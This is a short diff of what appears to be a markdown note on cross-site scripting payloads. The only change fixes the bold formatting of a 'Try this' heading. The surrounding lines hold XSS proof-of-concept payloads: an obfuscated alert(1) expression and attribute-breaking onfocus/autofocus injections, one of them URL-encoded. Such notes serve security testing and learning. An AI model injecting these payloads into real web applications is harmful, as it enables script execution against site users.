@@ -90,7 +90,8 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 "autofocus onfocus=alert(1)//
 ```
 -> Doesn't work
-**Try this
+
+**Try this**
 ```js
 "type%3d"text"autofocus%20onfocus%3d"alert(1)"
 ```
